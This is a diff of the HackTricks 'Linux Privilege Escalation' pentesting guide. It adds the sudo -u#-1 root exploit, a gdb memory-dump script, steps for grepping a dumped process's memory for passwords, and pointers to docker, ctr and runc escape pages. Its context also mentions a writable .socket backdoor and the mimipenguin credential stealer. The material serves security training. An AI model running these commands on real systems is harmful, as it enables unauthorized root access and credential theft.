@@ -1,8 +1,8 @@
 # Linux Privilege Escalation
 
-If you want to **know** about my **latest modifications**/**additions** or you have **any suggestion for HackTricks or PEASS**, **join the** [**💬**](https://emojipedia.org/speech-balloon/) ****[**PEASS & HackTricks telegram group here**](https://t.me/peass), or **follow me on Twitter** [🐦](https://emojipedia.org/bird/)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**  
-If you want to **share some tricks with the community** you can also submit **pull requests** to [https://github.com/carlospolop/hacktricks](https://github.com/carlospolop/hacktricks**]%28https://github.com/carlospolop/hacktricks) **that will be reflected in this book.  
-Don't forget to** give ⭐ on the github\*\* to motivate me to continue developing this book.
+If you want to **know** about my **latest modifications**/**additions** or you have **any suggestion for HackTricks or PEASS**, **join the** [**💬**](https://emojipedia.org/speech-balloon/) [**PEASS & HackTricks telegram group**](https://t.me/peass)**, or** follow me on Twitter ****[**🐦**](https://emojipedia.org/bird/)[**@carlospolopm**](https://twitter.com/carlospolopm).  
+**If you want to** share some tricks with the community **you can also submit** pull requests **to** [https://github.com/carlospolop/hacktricks](https://github.com/carlospolop/hacktricks) **that will be reflected in this book.  
+Don't forget to** give ⭐ on the github to motivate me to continue developing this book.
 
 ## System Information
 
@@ -84,6 +84,14 @@ You can check if the sudo version is vulnerable using this grep.
 sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
 ```
 
+### sudo &lt;= v1.28
+
+From @sickrov
+
+```text
+sudo -u#-1 /bin/bash
+```
+
 ### Dmesg signature verification failed
 
 Check **smasher2 box of HTB** for an **example** of how this vuln could be exploited
@@ -148,6 +156,12 @@ cat /proc/sys/kernel/randomize_va_space 2>/dev/null
 #If 0, not enabled
 ```
 
+### Docker Breakout
+
+If you are inside a docker container you can try to escape from it:
+
+{% page-ref page="docker-breakout.md" %}
+
 ## Drives
 
 Check **what is mounted and unmounted**, where and why. If anything is unmounted you could try to mount it and check for private info
@@ -166,7 +180,7 @@ grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc
 Enumerate useful binaries
 
 ```bash
-which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc rkt kubectl 2>/dev/null
+which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
 ```
 
 Also, check if **any compiler is installed**. This is useful if you need to use some kernel exploit as it's recommended to compile it in the machine where you are going to use it \(or in one similar\)
@@ -227,6 +241,21 @@ gdb -p <FTP_PROCESS_PID>
 strings /tmp/mem_ftp #User and password
 ```
 
+#### GDB Script
+
+{% code title="dump-memory.sh" %}
+```bash
+#!/bin/bash
+#./dump-memory.sh <PID>
+grep rw-p /proc/$1/maps \
+    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
+    | while read start stop; do \
+    gdb --batch --pid $1 -ex \
+    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
+done
+```
+{% endcode %}
+
 #### /proc/$pid/maps &  /proc/$pid/mem
 
 For a given process ID, **maps shows how memory is mapped within that processes'** virtual address space; it also shows the **permissions of each mapped region**. The **mem** pseudo file **exposes the processes memory itself**. From the **maps** file we know which **memory regions are readable** and their offsets. We use this information to **seek into the mem file and dump all readable regions** to a file.
@@ -261,6 +290,24 @@ To dump a process memory you could use:
 * Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) \(root is required\)
 
 ### Credentials from Process Memory
+
+#### Manual example
+
+If you find that the authenticator process is running:
+
+```bash
+ps -ef | grep "authenticator"
+root      2027  2025  0 11:46 ?        00:00:00 authenticator
+```
+
+You can dump the process \(see before sections to find different ways to dump the memory of a process\) and search for credentials inside the memory:
+
+```bash
+./dump-memory.sh 2027
+strings *.dump | grep -i password
+```
+
+#### mimipenguin
 
 The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) will **steal clear text credentials from memory** and from some **well known files**. It requires root privileges to work properly.
 
@@ -435,7 +482,7 @@ Sockets can be configured using `.socket` files.
 
 ### Writable .socket files
 
-If you find a **writable** `.socket` file you can **add** at the begging of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**  
+If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**  
 _Note that the system must be using that socket file configuration or the backdoor won't be executed_
 
 ### Writable sockets
@@ -519,7 +566,19 @@ Now, you can execute commands on the container from this `socat` connection.
 
 #### Others
 
-Note that if you have write permissions over the docker socket because you are **inside the group `docker`** you have [**more ways to escalate privileges**](interesting-groups-linux-pe/#docker-group).
+Note that if you have write permissions over the docker socket because you are **inside the group `docker`** you have [**more ways to escalate privileges**](interesting-groups-linux-pe/#docker-group). If the [**docker API is listening in a port** you can also be able to compromise it](../../pentesting/2375-pentesting-docker.md#compromising).
+
+### Containerd \(ctr\) privilege escalation
+
+If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:
+
+{% page-ref page="containerd-ctr-privilege-escalation.md" %}
+
+### **RunC** privilege escalation
+
+If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:
+
+{% page-ref page="runc-privilege-escalation.md" %}
 
 ## **D-Bus**
 
@@ -527,7 +586,7 @@ D-BUS is an **inter-process communication \(IPC\) system**, providing a simple y
 
 D-BUS, as a full-featured IPC and object system, has several intended uses. First, D-BUS can perform basic application IPC, allowing one process to shuttle data to another—think **UNIX domain sockets on steroids**. Second, D-BUS can facilitate sending events, or signals, through the system, allowing different components in the system to communicate and ultimately to integrate better. For example, a Bluetooth dæmon can send an incoming call signal that your music player can intercept, muting the volume until the call ends. Finally, D-BUS implements a remote object system, letting one application request services and invoke methods from a different object—think CORBA without the complications. _\*\*_\(From [here](https://www.linuxjournal.com/article/7744)\).
 
-D-Bus use an **allow/deny model**, where each message \(method call, signal emission, etc.\) can be **allowed or denied** according to the sum of all policy rules which match it. Each or rule in the policy should have the `own`, `send_destination` or `receive_sender` attribute set.
+D-Bus uses an **allow/deny model**, where each message \(method call, signal emission, etc.\) can be **allowed or denied** according to the sum of all policy rules which match it. Each or rule in the policy should have the `own`, `send_destination` or `receive_sender` attribute set.
 
 Part of the policy of `/etc/dbus-1/system.d/wpa_supplicant.conf`:
 
@@ -1032,7 +1091,7 @@ screen -ls
 **Attach to a session**
 
 ```bash
-screen -dr <session> #The -d is to detacche whoeevr is attached to it
+screen -dr <session> #The -d is to detacche whoever is attached to it
 screen -dr 3350.foo #In the example of the image
 ```
 
@@ -1358,7 +1417,7 @@ Files that ships in packages downloaded from distribution repository go into `/u
 
 ## Linux/Unix Privesc Tools
 
-#### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)\*\*\*\*
+#### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 
 **LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)\(-t option\)  
 **Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)  
